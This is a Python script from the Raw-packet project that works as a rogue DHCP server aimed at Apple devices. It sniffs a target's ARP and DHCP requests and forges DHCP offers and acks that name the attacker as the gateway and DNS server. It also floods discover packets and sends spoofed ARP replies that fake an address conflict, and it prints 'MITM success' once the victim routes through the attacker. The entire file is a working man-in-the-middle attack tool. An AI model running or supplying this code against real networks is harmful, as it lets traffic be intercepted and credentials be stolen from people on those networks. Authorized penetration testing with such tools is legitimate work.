#!/usr/bin/env python
# -*- coding: utf-8 -*-

# region Description
"""
apple_rogue_dhcp.py: Rogue DHCP server for Apple devices
Author: Vladimir Ivanov
License: MIT
Copyright 2019, Raw-packet Project
"""
# endregion

# region Import

# region Add project root path
from sys import path
from os.path import dirname, abspath
path.append(dirname(dirname(dirname(abspath(__file__)))))
# endregion

# region Raw-packet modules
from raw_packet.Utils.base import Base
from raw_packet.Utils.network import Ethernet_raw, ARP_raw, IP_raw, UDP_raw, DHCP_raw
from raw_packet.Utils.tm import ThreadManager
# endregion

# region Import libraries
from sys import exit
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW, htons
from time import sleep
# endregion

# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2019, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.0.4'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
# endregion

# region Check user, platform and create threads
Base = Base()
Base.check_user()
Base.check_platform()
tm = ThreadManager(3)
# endregion

# region Parse script arguments
parser = ArgumentParser(description='Rogue DHCP server for Apple devices')

parser.add_argument('-i', '--interface', help='Set interface name for send DHCP reply packets')
parser.add_argument('-t', '--target_mac', help='Set target MAC address, required!', required=True)
parser.add_argument('-I', '--target_ip', help='Set client IP address, required!', required=True)
parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')

args = parser.parse_args()
# endregion

# region Print banner if argument quit is not set
if not args.quiet:
    Base.print_banner()
# endregion

# region Set global variables
eth = Ethernet_raw()
arp = ARP_raw()
ip = IP_raw()
udp = UDP_raw()
dhcp = DHCP_raw()

target_mac_address = str(args.target_mac).lower()
target_ip_address = str(args.target_ip)
transaction_id_global = 0
requested_ip = None
print_possible_mitm = False
print_success_mitm = False
# endregion

# region Get your network settings
if args.interface is None:
    Base.print_warning("Please set a network interface for sniffing ARP and DHCP requests ...")
current_network_interface = Base.netiface_selection(args.interface)

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have MAC address!"
    exit(1)

your_ip_address = Base.get_netiface_ip_address(current_network_interface)
if your_ip_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have IP address!"
    exit(1)

your_netmask = Base.get_netiface_netmask(current_network_interface)
if your_netmask is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have network mask!"
    exit(1)

your_broadcast = Base.get_netiface_broadcast(current_network_interface)
if your_broadcast is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have broadcast!"
    exit(1)
# endregion

# region Create raw socket
SOCK = socket(AF_PACKET, SOCK_RAW)
SOCK.bind((current_network_interface, 0))
# endregion


# region Make DHCP offer packet
def make_dhcp_offer_packet(transaction_id, destination_ip=None):
    if destination_ip is None:
        destination_ip = "255.255.255.255"
    return dhcp.make_response_packet(source_mac=your_mac_address,
                                     destination_mac=target_mac_address,
                                     source_ip=your_ip_address,
                                     destination_ip=destination_ip,
                                     transaction_id=transaction_id,
                                     your_ip=target_ip_address,
                                     client_mac=target_mac_address,
                                     dhcp_server_id=your_ip_address,
                                     lease_time=600,
                                     netmask=your_netmask,
                                     router=your_ip_address,
                                     dns=your_ip_address)
# endregion


# region Make DHCP ack packet
def make_dhcp_ack_packet(transaction_id, destination_ip=None):
    if destination_ip is None:
        destination_ip = "255.255.255.255"
    return dhcp.make_response_packet(source_mac=your_mac_address,
                                     destination_mac=target_mac_address,
                                     source_ip=your_ip_address,
                                     destination_ip=destination_ip,
                                     transaction_id=transaction_id,
                                     your_ip=target_ip_address,
                                     client_mac=target_mac_address,
                                     dhcp_server_id=your_ip_address,
                                     lease_time=600,
                                     netmask=your_netmask,
                                     router=your_ip_address,
                                     dns=your_ip_address,
                                     dhcp_operation=5)
# endregion


# region DHCP response sender
def dhcp_response_sender():
    SOCK = socket(AF_PACKET, SOCK_RAW)
    SOCK.bind((current_network_interface, 0))

    offer_packet = make_dhcp_offer_packet(transaction_id_global)
    ack_packet = make_dhcp_ack_packet(transaction_id_global)

    while True:
        discover_packet = dhcp.make_discover_packet(source_mac=your_mac_address,
                                                    client_mac=eth.get_random_mac(),
                                                    host_name=Base.make_random_string(6))
        SOCK.send(discover_packet)
        SOCK.send(offer_packet)
        SOCK.send(ack_packet)
        sleep(0.05)
# endregion


# region Reply to DHCP and ARP requests
def reply(request):

    # region Define global variables
    global target_ip_address
    global target_mac_address
    global transaction_id_global
    global requested_ip
    global tm
    global SOCK
    global print_possible_mitm
    global print_success_mitm
    # endregion

    # region DHCP REQUESTS
    if 'DHCP' in request.keys():

        # region Get DHCP transaction id
        transaction_id = request['BOOTP']['transaction-id']
        # endregion

        # region DHCP DECLINE
        if request['DHCP'][53] == 4:
            Base.print_info("DHCP DECLINE from: ", target_mac_address, " transaction id: ", hex(transaction_id))
            if transaction_id_global != 0:
                tm.add_task(dhcp_response_sender)
        # endregion

        # region DHCP REQUEST
        if request['DHCP'][53] == 3:

            # region Get next DHCP transaction id
            if transaction_id != 0:
                transaction_id_global = transaction_id + 1
                Base.print_info("Current transaction id: ", hex(transaction_id))
                Base.print_success("Next transaction id: ", hex(transaction_id_global))
            # endregion

            # region Get DHCP requested ip address
            if 50 in request['DHCP'].keys():
                requested_ip = str(request['DHCP'][50])
            # endregion

            # region Print info message
            Base.print_info("DHCP REQUEST from: ", target_mac_address, " transaction id: ", hex(transaction_id),
                            " requested ip: ", requested_ip)
            # endregion

            # region If requested IP is target IP - print Possible mitm success
            if requested_ip == target_ip_address:
                if not print_possible_mitm:
                    Base.print_warning("Possible MiTM success: ", target_ip_address + " (" + target_mac_address + ")")
                    print_possible_mitm = True
            # endregion

        # endregion

    # endregion

    # region ARP REQUESTS
    if 'ARP' in request.keys():
        if requested_ip is not None:
            if request['Ethernet']['destination'] == "ff:ff:ff:ff:ff:ff" and \
                    request['ARP']['target-mac'] == "00:00:00:00:00:00":

                # region Set local variables
                arp_sender_mac_address = request['ARP']['sender-mac']
                arp_sender_ip_address = request['ARP']['sender-ip']
                arp_target_ip_address = request['ARP']['target-ip']
                # endregion

                # region Print info message
                Base.print_info("ARP request from: ", arp_sender_mac_address, " \"",
                                "Who has " + arp_target_ip_address + "? Tell " + arp_sender_ip_address, "\"")
                # endregion

                # region ARP target IP is DHCP requested IP
                if arp_target_ip_address == requested_ip:

                    # region If ARP target IP is target IP - print Possible mitm success
                    if arp_target_ip_address == target_ip_address:
                        if not print_possible_mitm:
                            Base.print_warning("Possible MiTM success: ",
                                               target_ip_address + " (" + target_mac_address + ")")
                            print_possible_mitm = True
                    # endregion

                    # region If ARP target IP is not target IP - send 'IPv4 address conflict' ARP response
                    else:
                        arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
                                                      ethernet_dst_mac=target_mac_address,
                                                      sender_mac=your_mac_address,
                                                      sender_ip=requested_ip,
                                                      target_mac=arp_sender_mac_address,
                                                      target_ip=arp_sender_ip_address)
                        SOCK.send(arp_reply)
                        Base.print_info("ARP response to:  ", arp_sender_mac_address, " \"",
                                        arp_target_ip_address + " is at " + your_mac_address,
                                        "\" (IPv4 address conflict)")
                    # endregion

                # endregion

                # region ARP target IP is your IP - MITM SUCCESS
                if arp_target_ip_address == your_ip_address:
                    if not print_success_mitm:
                        Base.print_success("MITM success: ", target_ip_address + " (" + target_mac_address + ")")
                        print_success_mitm = True
                    sleep(5)
                    exit(0)
                # endregion
    # endregion

# endregion


# region Main function
if __name__ == "__main__":

    # region Sniff network

    # region Create RAW socket for sniffing
    rawSocket = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
    # endregion

    # region Local variables
    ethernet_header_length = 14
    arp_packet_length = 28
    udp_header_length = 8
    # endregion

    # region Print info message
    Base.print_info("Waiting for a ARP or DHCP requests from: ", target_mac_address)
    # endregion

    # region Start sniffing
    while True:

        # region Get packets from RAW socket
        packets = rawSocket.recvfrom(2048)

        for packet in packets:

            # region Get Ethernet header from packet
            ethernet_header = packet[0:ethernet_header_length]
            ethernet_header_dict = eth.parse_header(ethernet_header)
            # endregion

            # region Success parse Ethernet header
            if ethernet_header_dict is not None:

                # region Target MAC address is Set
                if target_mac_address is not None:
                    if ethernet_header_dict['source'] != target_mac_address:
                        break
                # endregion

                # region ARP packet

                # 2054 - Type of ARP packet (0x0806)
                if ethernet_header_dict['type'] == 2054:

                    # Get ARP packet
                    arp_header = packet[ethernet_header_length:ethernet_header_length + arp_packet_length]
                    arp_header_dict = arp.parse_packet(arp_header)

                    # Success ARP packet
                    if arp_header_dict is not None:

                        # ARP Opcode: 1 - ARP request
                        if arp_header_dict['opcode'] == 1:

                            # Create full request
                            request = {
                                "Ethernet": ethernet_header_dict,
                                "ARP": arp_header_dict
                            }

                            # Reply to this request
                            reply(request)

                # endregion

                # region DHCP packet

                # 2048 - Type of IP packet (0x0800)
                if ethernet_header_dict['type'] == 2048:

                    # Get IP header
                    ip_header = packet[ethernet_header_length:]
                    ip_header_dict = ip.parse_header(ip_header)

                    # Success parse IP header
                    if ip_header_dict is not None:

                        # UDP
                        if ip_header_dict['protocol'] == 17:

                            # Get UDP header offset
                            udp_header_offset = ethernet_header_length + (ip_header_dict['length'] * 4)

                            # Get UDP header
                            udp_header = packet[udp_header_offset:udp_header_offset + udp_header_length]
                            udp_header_dict = udp.parse_header(udp_header)

                            # Success parse UDP header
                            if udp_header is not None:
                                if udp_header_dict['source-port'] == 68 and udp_header_dict['destination-port'] == 67:

                                    # Get DHCP header offset
                                    dhcp_packet_offset = udp_header_offset + udp_header_length

                                    # Get DHCP packet
                                    dhcp_packet = packet[dhcp_packet_offset:]
                                    dhcp_packet_dict = dhcp.parse_packet(dhcp_packet)

                                    # Create full request
                                    request = {
                                        "Ethernet": ethernet_header_dict,
                                        "IP": ip_header_dict,
                                        "UDP": udp_header_dict
                                    }
                                    request.update(dhcp_packet_dict)

                                    # Reply to this request
                                    reply(request)

                # endregion

            # endregion

        # endregion

    # endregion

    # endregion

# endregion
